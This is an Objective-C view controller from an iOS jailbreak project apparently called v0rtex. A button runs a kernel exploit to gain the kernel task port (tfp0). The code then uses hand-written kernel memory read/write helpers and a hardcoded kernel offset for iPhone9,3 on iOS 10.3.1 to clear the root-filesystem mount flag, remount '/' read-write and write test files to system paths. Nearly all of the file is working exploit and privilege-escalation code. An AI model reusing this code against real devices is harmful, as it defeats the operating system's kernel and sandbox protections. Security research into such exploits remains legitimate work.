//
//  ViewController.m
//  v0rtex
//
//  Created by Sticktron on 2017-12-07.
//  Copyright © 2017 Sticktron. All rights reserved.
//

#import "ViewController.h"

#include "v0rtex.h"
#include <sys/mount.h>

// Offsets for '/' remount
// This is for i7 (iPhone9,3) 10.3.1
// May vary for other devices
// Find via:
// nm kernelcache | grep _rootvnode
#define ROOT_MOUNT_ROOT_V_NODE          0xfffffff0075ec0b0

// For '/' remount (not offsets)
#define KSTRUCT_OFFSET_MOUNT_MNT_FLAG   0x70
#define KSTRUCT_OFFSET_VNODE_V_UN       0xd8


// mach (for kern r/w primitives)
kern_return_t mach_vm_write(
                            vm_map_t target_task,
                            mach_vm_address_t address,
                            vm_offset_t data,
                            mach_msg_type_number_t dataCnt);

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *outputView;
@property (weak, nonatomic) IBOutlet UIButton *sploitButton;
@end


@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    
    self.sploitButton.layer.cornerRadius = 6;
    self.outputView.layer.cornerRadius = 6;
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (IBAction)runSploitButton:(UIButton *)sender {
    
    // Run v0rtex
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"\n > running exploit... \n"];

    task_t tfp0 = MACH_PORT_NULL;
    kptr_t kslide = 0;
    
    kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide);
    kern_return_t ret = v0rtex(&tfp0, &kslide);
    
    if (ret != KERN_SUCCESS) {
        self.outputView.text = [self.outputView.text stringByAppendingString:@"ERROR: exploit failed \n"];
        return;
    }
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"exploit succeeded! \n"];
    
    
    // Write a test file to var
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"writing test file... \n"];
    
    extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
    uint32_t magic = 0;
    mach_vm_size_t sz = sizeof(magic);
    ret = mach_vm_read_overwrite(tfp0, 0xfffffff007004000 + kslide, sizeof(magic), (mach_vm_address_t)&magic, &sz);
    LOG("mach_vm_read_overwrite: %x, %s", magic, mach_error_string(ret));
    
    FILE *varF = fopen("/var/mobile/test.txt", "w");
    LOG("var file: %p", varF);
    if (varF == 0) {
        self.outputView.text = [self.outputView.text stringByAppendingString:@"ERROR: failed to write test var file \n"];
        return;
    }
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"wrote test var file! \n"];
    self.outputView.text = [self.outputView.text stringByAppendingString:[NSString stringWithFormat:@"/var/mobile/test.txt (%p) \n", varF]];
    
    
    // Remount '/' as r/w
    
    int remountOutput = mount_root(tfp0, kslide);
    LOG("remount: %d", remountOutput);
    if (remountOutput != 0) {
        self.outputView.text = [self.outputView.text stringByAppendingString:@"ERROR: failed to remount '/' as r/w"];
        return;
    }
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"remounted '/' as r/w \n"];
    
    
    // Write a test file to root
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"writing test root file... \n"];
    
    FILE *rootF = fopen("/test.txt", "w");
    LOG("root file: %p", rootF);
    if (rootF == 0) {
        self.outputView.text = [self.outputView.text stringByAppendingString:@"ERROR: failed to write root test file \n"];
        return;
    }
    
    self.outputView.text = [self.outputView.text stringByAppendingString:@"wrote test root file! \n"];
    self.outputView.text = [self.outputView.text stringByAppendingString:[NSString stringWithFormat:@"/test.txt (%p) \n", rootF]];
    
    
    // Done.
    self.outputView.text = [self.outputView.text stringByAppendingString:@"\n"];
    self.outputView.text = [self.outputView.text stringByAppendingString:@"done. \n"];
}

int mount_root(task_t tfp0, uint64_t kslide) {
    uint64_t _rootnode = ROOT_MOUNT_ROOT_V_NODE + kslide;
    uint64_t rootfs_vnode = rk64(tfp0, _rootnode);
    
    // read the original flags
    uint64_t v_mount = rk64(tfp0, rootfs_vnode + KSTRUCT_OFFSET_VNODE_V_UN);
    uint32_t v_flag = rk32_via_tfp0(tfp0, v_mount + KSTRUCT_OFFSET_MOUNT_MNT_FLAG + 1);
    
    // unset rootfs flag
    wk32(tfp0, v_mount + KSTRUCT_OFFSET_MOUNT_MNT_FLAG + 1, v_flag & ~(MNT_ROOTFS >> 8));
    
    // remount
    char *nmz = strdup("/dev/disk0s1s1");
    kern_return_t rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
    
    // set original flags back
    v_mount = rk64(tfp0, rootfs_vnode + KSTRUCT_OFFSET_VNODE_V_UN);
    wk32(tfp0, v_mount + KSTRUCT_OFFSET_MOUNT_MNT_FLAG + 1, v_flag);
    
    return rv;
}

uint64_t rk64(task_t tfp0, uint64_t kaddr) {
    uint64_t lower = rk32_via_tfp0(tfp0, kaddr);
    uint64_t higher = rk32_via_tfp0(tfp0, kaddr + 4);
    return ((higher << 32) | lower);
}

uint32_t rk32_via_tfp0(task_t tfp0, uint64_t kaddr) {
    kern_return_t err;
    uint32_t val = 0;
    mach_vm_size_t outsize = 0;
    err = mach_vm_read_overwrite(tfp0,
                                 (mach_vm_address_t)kaddr,
                                 (mach_vm_size_t)sizeof(uint32_t),
                                 (mach_vm_address_t)&val,
                                 &outsize);
    
    if (err != KERN_SUCCESS) {
        printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfp0);
        sleep(3);
        return 0;
    }
    
    if (outsize != sizeof(uint32_t)) {
        printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
        sleep(3);
        return 0;
    }
    
    return val;
}

void wk32(task_t tfp0, uint64_t kaddr, uint32_t val) {
    if (tfp0 == MACH_PORT_NULL) {
        printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
        sleep(3);
        return;
    }
    
    kern_return_t err;
    err = mach_vm_write(tfp0,
                        (mach_vm_address_t)kaddr,
                        (vm_offset_t)&val,
                        (mach_msg_type_number_t)sizeof(uint32_t));
    
    if (err != KERN_SUCCESS) {
        printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
        return;
    }
}

@end
